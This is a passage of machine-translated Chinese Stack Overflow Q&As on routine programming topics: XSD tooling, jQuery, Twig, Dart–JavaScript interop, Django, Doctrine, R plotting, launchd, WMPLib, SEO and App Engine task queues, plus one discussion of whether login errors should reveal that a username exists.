> *   [来自 targetNamespace=' http](http://www.w3.org/1999/XSL/Transform) ://www.w3.org/1999/XSL/Transform'的组 'char-instructions'定义无效：循环组引用。

成功运行命令需要哪些步骤或修改？或者，以前是否已经这样做过，并且结果可以在网络上获得吗？

（是的，我知道，[这个答案](https://stackoverflow.com/a/4139523/21336)建议编写我自己的课程）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-22T20:05:59.280

我终于通过增量编辑 xsd 文件并在修改后的文件上运行 xsd.exe 解决了这个问题。有关如何进行的详细信息，请参阅[我的博客。](http://devio.wordpress.com/2012/05/22/dealing-with-circular-group-reference-errors-in-xsd-exe/)

# javascript - 如何使用 javascript 将 html 元素添加到页面的头部元素？（跨浏览器->如IE）

> ID：10676217
> 
> 赞同：-1
> 
> 时间：2012-05-20T18:54:01.283
> 
> 标签：javascript, html, add, head

如何使用 javascript 将 html 元素添加到页面的头部元素？（向我们展示 jQuery 和 javascrip，但 js 非常重要）

堆栈中有一些关于此的线程，但没有一个显示 html 元素的方法。

```
"<b>Test</b>" 
```

例如其中之一是：

[将一些 HTML 附加到 HEAD 标记中？](https://stackoverflow.com/questions/2676336/append-some-html-into-the-head-tag)

如您所见，它是关于将 css 添加到 head 而不是 html 代码。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T18:57:28.280

`<b>`将元素放在头元素内是无效的..

允许的元素位于[http://www.w3.org/TR/html-markup/head.html](http://www.w3.org/TR/html-markup/head.html)（*阅读**允许的内容**部分和链接*）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-10-22T09:50:02.850

使用此代码，您可以在 head 部分附加多个带有 rendomnumber 的脚本

```
 var MultiJsLink = ['js/enjoyhint.min.js', 'js/tab-help-common-on-off.js'];
    var jshtml ='';
    $(MultiJsLink).each(function(i){
    jshtml += '<script src='+MultiJsLink[i]+'?vrsn='+Math.floor(Math.random() * 1000)+'><\/script>';
});

$('head').append(jshtml); 
```

您的脚本附加如下：

```
<script src=js/enjoyhint.min.js?vrsn=332></script><script src=js/tab-help-common-on-off.js?vrsn=57></script> 
```

# php - 如何在 TWIG 中获取当前 URL 或路由？

> ID：10676218
> 
> 赞同：6
> 
> 时间：2012-05-20T18:54:03.977
> 
> 标签：php, symfony, twig

我对 Symfony2 非常陌生，我需要能够在 TWIG 中测试当前路线，以便我可以在模板中显示子菜单，其渲染如下：

```
{% render "CPAdminBundle:Messages:sidebarMenu" %}
{% render "CPAdminBundle:Readings:sidebarMenu" %} 
```

在侧边栏模板中，我尝试使用以下内容，但会引发错误：

```
path(app.request.attributes.get('_route')) 
```

做我想要完成的事情的正确方法是什么？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-05-20T19:13:50.883

您要进行的检查不属于视图。视图应该只负责显示，而不是做任何逻辑。

在您的控制器中进行检查并将其存储在一个变量中，将此变量传递给您的视图，并在其中检查此变量的值。
如果您想对每个操作都执行此操作，请查看[kernel.controller 事件](http://symfony.com/doc/current/book/internals.html)。

如果您想在视图中执行此操作，只需与`app.request.attributes.get('_route')`您想要的路线进行比较。我不明白你为什么放`path()`.

```
{% if app.request.attributes.get('_route') == 'my_route' %}
{% endif %} 
```

# security - 我应该区分错误的登录和错误的密码错误代码吗？

> ID：10676221
> 
> 赞同：2
> 
> 时间：2012-05-20T18:54:16.183
> 
> 标签：security

我正在设计一个基本网站，其访问受到经典登录和密码系统的限制。

当用户输入不存在的登录名以及为现有帐户输入无效密码时，我无法决定是否应该显示不同的消息。

我的第一个直觉是不要显示不同的消息，因为这会给潜在的攻击者提示错误的地方，但这样做有时会使用户更难理解他的错误（也许他只是输入错误的帐户登录名和适当的错误信息会更好）。另一方面，我经常听说帐户登录不是**秘密**（**密码**显然是），因此提供有关它的信息不应降低安全级别。

你们对此有什么好的做法/理由吗？

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T18:56:20.447

不要区分这些 - 这是可以被恶意方使用的信息。

如果他们知道用户名是正确的，那么他们已经掌握了您泄露的宝贵信息。

为什么登录失败对您的用户来说是一个小小的不便，毕竟他们仍然必须输入用户名和密码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T15:44:49.490

我认为没有任何具体理由不告诉用户出了什么问题。这个问题之前被问过，你可以在这里看到我的回答（但请原谅我的英语不好）：[https ://stackoverflow.com/a/8612838/455006](https://stackoverflow.com/a/8612838/455006)

但重点是这些：系统应该尽可能地使暴力破解，即使攻击者知道一个用户名，你应该或多或少地指望“他们”知道至少一个用户名这一事实，因为那里有许多方法可以以相当准确的方式猜测或计算那些。依靠不知道用户名的攻击者由于晦涩难懂而接近安全，而且如果你总是指望攻击者知道用户名，那么你的安全方案和计划很可能会好得多。

请注意，在某些情况下，这些参数并不那么相关：这些情况下，其中的用户名本身可用于恶意活动（即，用户名是可用于发送垃圾邮件的电子邮件地址，或者某些帐号，可用于网络钓鱼攻击等）。您可能会争辩说，网站上的内容可能非常重要，即使是隐蔽保护也很重要，但在这种情况下，我坚信您应该使用 2 因素身份验证、一次性密码或类似的东西。有许多开源和/或免费的解决方案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-20T18:59:38.933

通常的做法是在 borh 情况下表现相同，以免帮助攻击者找出哪些用户名是有效的。如果他已经死了，没有造成任何伤害，如果他没有，不要让他更容易。在这种情况下，合法用户的不便被认为不如针对恶意第三方的防御重要。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-21T11:19:18.470

“消息”和“错误代码”之间是有区别的。

当用户尝试登录失败时，最好在**内部**区分错误的用户名和错误的密码（可能用于记录目的）。

但是，在这两种情况下显示给用户的**消息**应该是相同的——例如“您提供了不正确的用户名/密码*组合*”。如果您在每种情况下使用不同的消息，您实际上是在提供“此用户名存在吗？” 表单，它可以帮助潜在的攻击者获得对用户帐户的访问权限。

使用相同的消息确实可能会给用户带来一点不便，但最终安全性应该是更高的优先级。无论如何，现在或多或少的常见做法是为错误的用户名和错误的密码显示相同的消息。

# javascript - 如何使用 Dart 向 JavaScript 函数发送和接收变量？

> ID：10676228
> 
> 赞同：2
> 
> 时间：2012-05-20T18:55:37.727
> 
> 标签：javascript, dart

我一直在使用一些代码（由 John Evans 编写）从 Dart 中执行 javascript：

```
void injectJavascript(String javascript, [bool removeAfter = false]){
  var s = new Element.tag("script");
  s.attributes["type"] = "text/javascript";
  s.text = javascript;
  document.body.nodes.add(s);
  if (removeAfter != null && removeAfter)
    s.remove();
}

injectJavascript("alert('using javascript')"); 
```

但我无法发送或返回变量。这目前可能吗？如果没有，知道什么时候可以实现吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-20T19:53:52.890

您将需要使用[postMessage](http://api.dartlang.org/html/Window.html#postMessage)来执行此操作。例如，如果您已将变量转换为 JSON，那么您可以在 Dart 内部执行此操作

> window.postMessage(jsonMessage, "*");

然后像这样从JavaScript端拿起它

```
function recieveMessage(event) {
  var message = JSON.parse(event.data);
  :
}
window.addEventListener("message", receiveMessage, false); 
```

如果您需要使用更高级的东西，例如双向通信和回调，请查看 DartGap 的代码，特别是[DeviceMessageRouter](https://github.com/Qalqo/dartgap/blob/master/src/impl/_DeviceMessageRouter.dart)类和[javascript 集成](https://github.com/Qalqo/dartgap/blob/master/DartGap.js)层。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-04-08T13:22:11.857

您可以使用[dart.js](https://api.dartlang.org/stable/1.15.0/dart-js/dart-js-library.html)直接执行 javascript 函数并捕获返回。

```
var result = js.context.callMethod('getAnswer', [new js.JsObject.jsify(myargs)]); 
```

然而，传递/返回对象的类型是有限的。有关可以直接传递哪些对象的信息，请参阅上面的链接。另请注意，在用作 callMethod 的参数之前，列表和应该是“jsified”。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-01-20T12:16:44.980

您可以使用[dart:js](https://api.dartlang.org/docs/channels/stable/latest/dart_js.html)。

> 该库提供从 Dart 访问 JavaScript 对象，允许 Dart 代码获取和设置属性，调用 JavaScript 对象的方法和调用 JavaScript 函数。该库负责在可能的情况下在 Dart 和 JavaScript 对象之间进行转换，或者在无法转换时提供代理。

另请参阅文章[使用 Dart 中的 JavaScript](https://www.dartlang.org/articles/js-dart-interop/)。

# jquery - 如何显示和隐藏 div

> ID：10676229
> 
> 赞同：4
> 
> 时间：2012-05-20T18:55:49.317
> 
> 标签：jquery, css

当用户点击时`MoreDiv` `HiddenDiv`将显示，当再次点击或点击页面`hiddenDiv`div的任何位置时，必须隐藏更多

这是我的CSS

```
.hiddenDiv {
  margin-left:505px;
  margin-top:25px;
  display:none;
  z-index:9876567890;
  position:absolute;
  width:100px;
  border:1px solid #CCC;
}
.hiddenDiv ul { 
  list-style:none;
  list-style-type:none;
  padding:0;
  margin:0;
}
.hiddenDiv ul li {
  padding:2px;
  cursor:pointer;
} .hiddenDiv ul li:hover {
  background-color:#4681C5;
} 
```

这是我的 div

```
<div class="hiddenDiv">
  <ul>
    <li>Add favorites</li>
    <li>Give a Gift</li>
    <li>Block</li>
  </ul>
</div> 
```

这是我的jQuery代码

```
$(document).ready(function() { 
  $('div.moreDiv').click(function() {
    $(".hiddenDiv").css('display', 'block');
  });
}); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T19:08:42.993

使用切换方法显示和隐藏 div。

```
$(document).ready(function() {
    $('div.moreDiv').click(function() {
        $(".hiddenDiv").toggle() });
});​ 
```

[http://jsfiddle.net/R7VRq/24/](http://jsfiddle.net/R7VRq/24/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-20T19:01:18.040

使用`show`方法

当您单击更多链接时，将显示以下脚本，如果您单击窗口中的任意位置，则将其隐藏。

```
$(document).ready(function() {
   $(document).click(function() {        
    ShowHide();
   });

   $('div.moreDiv').click(function(e) {
      e.stopPropagation();
      ShowHide(true);
   });
});

function ShowHide(isFirstTime)
{
     var disp= $(".hiddenDiv").css("display");
     if((disp=="none")&&(isFirstTime))
     {                            
         $(".hiddenDiv").show()             
     }
     else
     {
          $(".hiddenDiv").hide()
     }        
} 
```

工作样本：http: [//jsfiddle.net/R7VRq/31/](http://jsfiddle.net/R7VRq/31/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-20T19:06:00.927

```
$(function() { 
    $('div.moreDiv').click(function() {
        if ($(this).hasClass('showing_hidden_div')) {
            $(this).removeClass('showing_hidden_div');
            $('.hiddenDiv').hide();
        } else {
            $(this).addClass('showing_hidden_div');
            $(".hiddenDiv").show();
        }
    });
}); 
```

应该这样做。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-20T18:59:20.413

在这种情况下，DIV 的 id 为 DIV1，正如您在 javascript 中看到的那样。只需使用javascript，不需要jquery，无论如何这更容易。

```
<div class="moreDiv">More </div><div  id="DIV1" class="hiddenDiv"><ul><li>Add favorites</li><li>Give a Gift</li><li>Block</li></ul></div> 
```

Javascript：

```
function ShowDIV(){
if (DIV1.style.display=="none") DIV1.style.display="block";
else DIV1.style.display="none";
} 
```

Html 隐藏或显示 div：

```
<a href="#" onClick="ShowDIV();"><button>Show DIV</button></a> 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-20T19:05:11.950

## *[jsBin 演示](http://jsbin.com/akeqeb/3/edit)*

*   用于`.toggle()`切换“显示”状态。
*   添加事件侦听器并使用`.stopPropagation()`. 这将防止单击事件被传递（冒泡）给您的元素祖先。
*   添加一个`if`语句来检查`body`点击 - 查看弹出窗口是否可见 - 如果为真则隐藏它：

问：

```
 $('div.moreDiv').click(function(e){ // 'e' = event listener
       e.stopPropagation();    // event - stop propagation to body, parents.
       $(".hiddenDiv").toggle();   // toggle 'display' states             
  });

  $('body').click(function(){     
      if( $(".hiddenDiv").is(':visible') ){    // check if element is visible
          $(".hiddenDiv").hide();              // if true - hide it
      }
  }); 
```

[http://api.jquery.com/event.stopPropagation/](http://api.jquery.com/event.stopPropagation/)
[http://api.jquery.com/visible-selector/](http://api.jquery.com/visible-selector/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-20T18:59:37.917

jquery 中有一个[.hide()](http://api.jquery.com/hide/)方法用于隐藏元素。使用`body`onclick 隐藏您的 div。

# django - Django在查询集中订购外键项目

> ID：10676232
> 
> 赞同：0
> 
> 时间：2012-05-20T18:56:07.970
> 
> 标签：django, django-queryset

我正在使用 Django 模型抽象基类从数据库生成我的网站菜单。我的模型如下所示：

```
# ABSTRACT MENU 
class Menu(models.Model):
    position = models.IntegerField("Item Position", max_length=2, unique=False)
    title_en = models.CharField("Title (English)", max_length=50)
    title_es = models.CharField("Titulo (Español)", max_length=50)
    url_en = models.URLField("url (English)")
    url_es = models.URLField("url (Español)")       

    def __unicode__(self):
        return self.title_en

    class Meta:
        abstract = True

# top (main) menu ---> inherits from MENU
class MainMenu(Menu):
    class Meta:
        verbose_name_plural = "Menu Items"  

# submenu - for drop downs ---> inherits from MENU
class SubMenu(Menu):
    main_menu = models.ForeignKey(MainMenu, null=True, blank=True)
    class Meta:
        verbose_name_plural = "Sub Menu Items" 
```

然后对于菜单我这样做：

```
menu_items = MainMenu.objects.all().select_related().order_by('position') 
```

这很好，并生成按位置排序的主菜单项。但是，子菜单项没有排序。如何确保子菜单项也按位置排序？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:00:28.373

您是否尝试过在模型[类](https://docs.djangoproject.com/en/dev/ref/models/options/#ordering)[中定义顺序`Meta`](https://docs.djangoproject.com/en/dev/ref/models/options/#ordering)？只要您`position`在每种情况下都可以成为默认顺序，它就不会被显式覆盖（这可能会对大型查询产生性能影响），这应该完全不需要使用 .order_by() 。不过，我还没有针对你的具体情况尝试过这个，所以如果它不起作用，请告诉我。

编辑：还考虑查看[order_with_respect_to](https://docs.djangoproject.com/en/dev/ref/models/options/#order-with-respect-to)的相关模型

# doctrine-orm - 使用带有silex的doctrine2 sluggable扩展

> ID：10676242
> 
> 赞同：2
> 
> 时间：2012-05-20T18:56:48.903
> 
> 标签：doctrine-orm, silex

我遇到了一个奇怪的问题，试图在 silex 中使用 sluggable 和 timestampable 的学说 2 扩展。

首先，按照本指南，我已经成功地将教义2与silex一起使用：

[http://martinsikora.com/silex-doctrine2-orm](http://martinsikora.com/silex-doctrine2-orm)

之后，使用这个其他指南，我向我的实体管理器添加了 sluggable 和带时间戳的侦听器：

[http://silex-doctrine-extensions.readthedocs.org/en/latest/doctrine.html](http://silex-doctrine-extensions.readthedocs.org/en/latest/doctrine.html)

现在在我的实体中，我遇到了这个问题：

如果我使用类似的东西：

```
use Gedmo\Mapping\Annotation as Gedmo;
use Doctrine\ORM\Mapping as ORM;

/**
 * @ORM\Entity
 */ 
```

学说2不认识我的实体，我需要使用：

`@Entity`代替`@ORM\Entity`

但是，如果我使用`@ORM\Entity`gedmo 似乎可以工作，但他说他找不到 sluggable 或时间戳字段（修改、创建等），并且如果我运行 orm:generate-entities 学说 2，则找不到我的实体。

如果我使用`@Entity`而不是`@ORM\Entity`一切都可以正常工作，但是当我添加 gedmo 注释时，例如：

```
use Gedmo\Mapping\Annotation as Gedmo;

@Gedmo\Timestampable(on="create") 
```

实体给了我关于正常注释的错误，比如`@Column(type="datetime")`

我认为唯一的方法是`@ORM\`像我在互联网上找到的每个示例一样使用前缀，但是使用此前缀`orm:generate-entities`停止查找我的实体。

在 symfony2 中我没有这个问题，我使用`@ORM\`前缀和学说 2 扩展 sluggable 和时间戳，就像一个魅力，我使用 Silex 遇到了这个问题，它没有对学说 2 orm 的本机支持，只有 dbal，所以我使用以下提供程序来使用nutwerk-orm-扩展

如果你们有什么想法，请与我分享。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-11T09:37:26.690

您是否在 composer 中添加了 Gedmo 命名空间？

```
{
    "autoload": {
        "psr-0": {
            "Gedmo": "vendor/gedmo/doctrine-extensions/lib'"
        },
} 
```

我将此扩展与 Silex 一起使用：

[https://github.com/dflydev/dflydev-doctrine-orm-service-provider](https://github.com/dflydev/dflydev-doctrine-orm-service-provider)

我添加提供者和订阅者：

```
//Setting Doctrine ORM
$app->register(new Dflydev\Silex\Provider\DoctrineOrm\DoctrineOrmServiceProvider, array(
    "orm.proxies_dir" => $app['db.orm.proxies_dir'],
    "orm.em.options" => array(
        "mappings" => array(
            array(
                "type" => "annotation",
                "namespace" => "Entity",
                "path" => 'my_path',
            )
        ),
    ),
));

//Setting Doctrine2 extensions

$timestampableListener = new \Gedmo\Timestampable\TimestampableListener();
$app['db.event_manager']->addEventSubscriber($timestampableListener); 
```

它对我有用，但我必须在我的实体中添加这些“用途”：

```
namespace Entity;

use Gedmo\Mapping\Annotation as Gedmo;
use Doctrine\ORM\Mapping\Id;
use Doctrine\ORM\Mapping\Column;
use Doctrine\ORM\Mapping\GeneratedValue;

/**
 * EntityPages
 *
 * @Table(name="pages")
 * @Entity(repositoryClass="Entity\Repository\PagesRepository")
 * @HasLifecycleCallbacks()
 */
class EntityPages
{
    /**
     * @var integer
     *
     * @Column(name="id", type="integer", precision=0, scale=0, nullable=false, unique=false)
     * @Id
     * @GeneratedValue(strategy="IDENTITY")
     */
    private $id; 
```

# android - android录音 - 时间问题

> ID：10676246
> 
> 赞同：1
> 
> 时间：2012-05-20T18:57:08.840
> 
> 标签：android, audio

我正在录制一些东西，我想知道我录制的东西发生的确切时间。

例如，我做了一个开始记录命令（例如调整为 1 秒记录），然后我使用读取命令将数据读入缓冲区。然后我在主缓冲区的小块上使用 FFT 处理数据，并找出缓冲区中我正在等待的频率。现在我想知道这个频率究竟是什么时候在现实生活中播放的。

我希望你能理解我的问题..谢谢，

提供。

# r - 使用 lattice 绘制已排序分类数据的直方图

> ID：10676247
> 
> 赞同：1
> 
> 时间：2012-05-20T14:20:24.753
> 
> 标签：r, histogram, lattice

考虑以下数据文件：

```
column_name
foo
foo
bar
baz
baz
bar
foo
baz 
```

如何使用 lattice 包绘制直方图，并按自定义顺序（非字母顺序）排序，例如：`c('baz', 'foo', 'bar')`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T21:33:39.337

```
(histogram( y ~ x | factor(column_name, levels=c('baz', 'foo', 'bar') ) ) 
```

也许：

```
(histogram( y ~  factor(column_name, levels=c('baz', 'foo', 'bar') ) ) 
```

或者甚至更好地将所有内容放在数据框中，然后执行以下操作：

```
dfrm$column_name <-  factor(dfrm$column_name, levels=c('baz', 'foo', 'bar') ) )
histogram( y ~ column_name, data=dfrm ) 
```

（格函数通常期望主要数据参数来自数据框。）

# jquery - 提交时的 Jquery 对话框在白色视口中返回 Json 数据

> ID：10676251
> 
> 赞同：1
> 
> 时间：2012-05-20T18:57:31.680
> 
> 标签：jquery, asp.net-mvc, jquery-ui, jquery-dialog

当我按下保存按钮时，我从控制器返回：

```
return Json(new { success = true }); 
```

我的整个浏览器视口是白色的，在左上角我看到我返回的 json 数据：

```
{"success":true} 
```

问题：这个白色视口是固定的，我需要改变什么？

我的期望是检查成功：客户端的真/假，并取决于我关闭对话框或更改一些数据的值，并且调用对话框的站点应该保留。

```
 $(document).ready(function () {

        // the div holds the html content
        var $dialog = $('<div></div>')  
        .dialog({
            autoOpen: false,
            title: 'This is the dialogs title',
            height: 400,
            width: 400,
            modal: true,
            resizable: false,
            hide: "fade",
            show: "fade",
            open: function (event, ui) {
                $(this).load('@Url.Action("Create")');
            },
            buttons: {
                "Save": function () {
                    var form = $('form', this);
                    $(form).submit();
                },
                "Close": function () {
                    $(this).dialog("close");                   
                }
            } // no comma
        });

        $('#CreateTemplate').click(function () {
            $dialog.dialog('open');
            // prevent the default action, e.g., following a link
            return false;
        });

    });

</script> 
```

创建视图：

```
@using (Html.BeginForm("JsonCreate", "Template"))
{ 
    <p class="editor-label">@Html.LabelFor(model => model.Name)</p>
    <p class="editor-field">@Html.EditorFor(model => model.Name)</p>
    <p class="editor-field">@Html.ValidationMessageFor(model => model.Name)</p>    
} 
```

**更新**

```
"Save": function () {
                    var form = $('form', this);
                    debugger;
                    $.ajax({
                        url: this.action,
                        type: 'POST',
                        data: form.serialize(),
                        dataType: 'json',
                        success: function (result) {
                            debugger;   
                            if (result.success) {
                                $(this).dialog("close");
                                // Update UI
                            }
                            else {
                                // Reload the dialog to show model errors                    
                                $(dialog).html(result);
                            } // else end
                        } // success end
                    }); // ajax post end

                }, 
```

**控制器**POST 动作：

```
 [HttpPost]
        public ActionResult JsonCreate(Template template)
        {
            if (ModelState.IsValid)
            {
                _templateDataProvider.AddTemplate(template);
                return Json(new { success = true });
            }

            return Json(new { errors = GetErrorsFromModelState() });
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T19:06:04.437

您必须进行 Ajax 提交，以使页面保持在相同的 url 上：

```
 "Save": function () {
                var form = $('form', this);
                //$(form).submit();
                $.post(form.prop('action'), form.serialize(), function(response){
                    //do something with response data or ignore it
                }, 'json');
            }, 
```

# plist - “你好世界”启动的 plist 不工作

> ID：10676252
> 
> 赞同：4
> 
> 时间：2012-05-20T18:57:34.270
> 
> 标签：plist, launchd

我在 ~/Library/LaunchAgents 有以下 plist 文件：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>com.yogapo.test_launchd</string>

    <key>Program</key>
    <string>. /Users/luke/dev/data_yogapo/script/test_launchd.sh</string>

    <key>StartInterval</key>
    <integer>10</integer>

    <key>RunAtLoad</key>
    <true/>
  </dict>
</plist> 
```

test_launchd.sh 文件包含以下内容：

```
#! /bin/bash 

echo "hello world from test_launchd.sh" >> /Users/luke/dev/data_yogapo/log/development.log 
```

当我手动运行 test_launchd.sh 时
`. /Users/luke/dev/data_yogapo/script/test_launchd.sh` ，结果符合预期：该行出现在末尾`development.log`

但是当我加载这个 plist 文件时，什么也没有发生：

```
$ cd ~/Library/LaunchAgents
$ launchctl load com.yogapo.test_launchd.plist
$ launchctl list | grep yogapo
  -       1       com.yogapo.test_launchd 
```

我已经尝试过使用和不使用 RunAtLoad 键。我已经在 SO 以及互联网上的其他地方查看了其他答案。我已经按照教程进行操作，但根本没有发生任何事情。非常感谢任何帮助 - 谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-23T01:49:57.963

您要求`launchd`运行名为

```
". /Users/luke/dev/data_yogapo/script/test_launchd.sh" 
```

它将`Program`键的整个值作为第一个参数（有关更多详细信息，`execvp`请参见[man execvp(3) ）](https://developer.apple.com/library/mac/#documentation/darwin/reference/manpages/man3/execvp.3.html#//apple_ref/doc/man/3/execvp)

如果您要检查`system`日志，您会看到如下内容：

> 5 月 22 日 21:17:38 凹陷 com.apple.launchd.peruser.501[202] (com.yogapo.test_launchd[32986]): posix_spawn("./Users/luke/dev/data_yogapo/script/test_launchd.sh" , ...)：没有这样的文件或目录 5 月 22 日 21:17:38 凹痕 com.apple.launchd.peruser.501[202] (com.yogapo.test_launchd[32986])：退出并退出代码：1

`launchd`不是壳。但是，它可以解释 hash-bang 字符序列来识别使用哪个程序来解释您的脚本。因此，只需将您的脚本指定为要运行的程序：

```
<key>Program</key>
<string>/Users/luke/dev/data_yogapo/script/test_launchd.sh</string> 
```

*注意*：如果您需要将参数传递给脚本，请改用`ProgramArguments`密钥并将整个命令行放在那里。例如：

```
<key>ProgramArguments</key>
<string>/Users/luke/dev/data_yogapo/script/test_launchd.sh arg1 arg2 arg3</string> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-17T15:26:14.597

解决方案我发现最简单的方法是下载一个应用程序来操作这些文件：

[https://itunes.apple.com/us/app/launchd-task-scheduler/id620249105](https://itunes.apple.com/us/app/launchd-task-scheduler/id620249105)

# r - 如何在R中对齐轴以使两个轴相交

> ID：10676254
> 
> 赞同：0
> 
> 时间：2012-05-20T16:13:33.743
> 
> 标签：r

例如，我有以下简单的命令：

```
x<-rnorm(2000, 0, 30)
hist(x) 
```

`y=0`但是该图显示了线和 x 轴之间的间隙。我希望它以正常格式显示，其中两个轴在`(x0, y0)`我可以任意指定的特定点相互接触。这样做的选择是`R`什么？

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T00:44:51.747

我认为最简单的方法是简单地使用 绘制它`box`，因为`plot.histogram`跳过了许多允许您`par`直接传递适当设置的绘图设置：

```
x<-rnorm(2000, 0, 30)
hist(x)
box(bty = "l") 
```

`par`有关`bty`可能的选项，请参阅中的部分。

![在此处输入图像描述](../Images/e7a9a535cf92f376471719f0b8b33043.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-20T22:02:03.807

一种方法是单独绘制 x 轴并将`line`其与 0 坐标对齐。

```
loc <- hist(x, xaxt="n",bty="l")
axis(1, at=loc$breaks,line=-.75) 
```

![在此处输入图像描述](../Images/f0594a11438454768ff70c1180bdb983.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-20T19:07:53.237

您可以在中指定`xlim`和。`ylim``hist`

查看

```
?hist 
```

和

```
hist(x, xlim = c(-100, 100), ylim = c(0, 500)) 
```

# c# - C# 中的 WMP 库 - 列表中的播放列表

> ID：10676255
> 
> 赞同：0
> 
> 时间：2012-05-20T18:57:59.543
> 
> 标签：c#, wmp, wmplib

我刚刚发现了适用于 C# 的 Windows Media Player 库，因为我正在为我的朋友制作一个愚蠢的小应用程序，所以我想我会把它添加进去（因为他喜欢音乐）。

```
string ply = "Playlist";
        WMPLib.IWMPPlaylist pls;
        WMPLib.IWMPPlaylistArray plItems;

        plItems = axWindowsMediaPlayer1.playlistCollection.getByName(ply);

        if (plItems.count == 0)
        {
            pls = axWindowsMediaPlayer1.playlistCollection.newPlaylist(ply);
        }
        else
        {

            plItems.Item(0);

            string line;
            System.IO.StreamReader stream = new StreamReader(pth);
            while ((line = stream.ReadLine()) != null)
            {
                if (File.Exists(line))
                {
                    WMPLib.IWMPMedia m1 = axWindowsMediaPlayer1.newMedia(line);

                    pls.appendItem(m1); /*gives an error here (use of unassigned variable)*/
                }
            }
        }
    } 
```

我已经尝试创建播放列表的一个实例，但我无法让它允许该行，任何帮助将不胜感激（请注意，“pth”字符串是在方法的前面声明的

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T19:17:06.397

问题是如果`plItems.count`大于 0，则`pls`永远不会设置为任何内容，因此您无法调用`appendItem`它。

也许你想说

```
pls = plItems.Item(0); 
```

代替

```
plItems.Item(0); 
```

（不做任何事情）在您的`else`分支中。这将导致您的应用将媒体项目添加到库中的第一个播放列表。

# url - 2 个定位到相同 url 的锚文本

> ID：10676261
> 
> 赞同：0
> 
> 时间：2012-05-20T18:58:22.960
> 
> 标签：url, seo

我有一个查询。假设这里有 2 个锚文本针对来自同一域内的相同 URL，Google 会认为这两个锚文本与该 URL 相关，用于 SEO 目的？例如：从主页锚文本“bid and win”对应于[http://example.com/123url.php](http://example.com/123url.php) 锚文本“在线拍卖”对应于相同的 uRL，即[http://example.com/123url.php](http://example.com/123url.php)

基本上，页面顶部提到了第一个锚文本，页面底部提到了第二个锚文本。

那么 google 将如何关联哪个锚文本应该对应哪个 URL 呢？其次，指向同一个 URL 的 2 个或更多完全不同的锚文本会影响 SEO 吗？

感谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T12:09:37.950

通常，页面页脚的导航链接可以被认为是放置在突出位置的链接价值较低。重播你的问题：

*   谷歌可以根据它们在页面中的位置、页脚、网页标题来考虑这两个 URL。
*   我不这么认为，特别是在同一个域上，当然给链接一个相关的锚文本是有好处的，所以确保链接对你的用户有用，并注意页面的内容以获得更好的排名。

如果这篇文章回答了你的问题，请告诉我。

# python - Google App Engine 上的 Twitter 应用程序的正确方法是什么？

> ID：10676264
> 
> 赞同：4
> 
> 时间：2012-05-20T18:58:49.160
> 
> 标签：python, google-app-engine, task-queue

我正在尝试在 Google App Engine 上开发 Twitter 应用程序。该应用程序基本上收集来自 Twitter 用户及其关注者及其关注者等的所有推文。它通常为每个用户每次运行收集 500 条推文，然后将用户的数据插入数据库。

推文收集过程必须每小时完成一次。目前，我正在使用 cron 作业来执行此操作。但它给出了很多 Deadline exceeded 错误，即使对于一个用户也是如此，这不是一个好兆头。我正在使用 Python。所以我想知道我应该用什么来做这个？我在网上搜索并知道可以使用任务队列和 cron。但我不知道该怎么做。如果有人可以帮助我，我将非常感激。还有其他我可以使用的方法/方法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T19:29:48.917

为避免 DeadlineExceededExceptions，请使用多个延迟[推送任务队列](https://developers.google.com/appengine/docs/python/taskqueue/overview-push)。使用任务队列，可以更轻松地将多个任务分解为更小的工作单元，从而防止任何单个任务超过分配给任务队列的 10 分钟阈值。

> 使用任务队列 API，应用程序可以在用户请求之外执行由用户请求发起的工作。如果应用程序需要执行一些后台工作，它可以使用任务队列 API 将该工作组织成小的离散单元，称为任务。该应用程序将任务添加到任务队列以稍后执行。

[延迟任务队列](https://developers.google.com/appengine/docs/python/taskqueue/overview-push#Deferred_Tasks)是推送任务队列，本质上是计划任务，它们具有预定的触发时间。以下是如何创建延迟任务的简短示例：

```
import logging

from google.appengine.ext import deferred

  def do_something_expensive(a, b, c=None):
      logging.info("Fetching Twitter feeds!")
      # Fetch the Twitter data here

# Somewhere else - Pass in parameters needed by the Twitter API
deferred.defer(do_something_expensive, "BobsTwitterParam1", "BobsTwitterParam2", c=True)
deferred.defer(do_something_expensive, "BobsFriendTwitterParam1", "BobsFriendTwitterParam2", c=True) 
```

